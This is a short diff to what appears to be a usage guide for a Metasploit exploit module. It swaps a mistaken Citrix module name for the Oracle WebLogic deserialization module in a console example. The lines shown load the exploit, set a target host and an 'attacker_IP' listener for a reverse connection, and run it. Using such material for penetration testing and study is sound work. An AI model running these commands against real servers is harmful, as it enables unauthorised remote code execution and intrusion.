@@ -26,7 +26,7 @@ msfdb reinit; msfconsole -q
 use exploits/multi/misc/weblogic_deserialize_badattrval.rb
 ```
 ```
-exploit(freebsd/http/citrix_formssso_target_rce) > set rhosts target_IP
-exploit(freebsd/http/citrix_formssso_target_rce) > set lhost attacker_IP
-exploit(freebsd/http/citrix_formssso_target_rce) > run
+exploit(multi/misc/weblogic_deserialize_badattrval) > set rhosts target_IP
+exploit(multi/misc/weblogic_deserialize_badattrval) > set lhost attacker_IP
+exploit(multi/misc/weblogic_deserialize_badattrval) > run
 ```
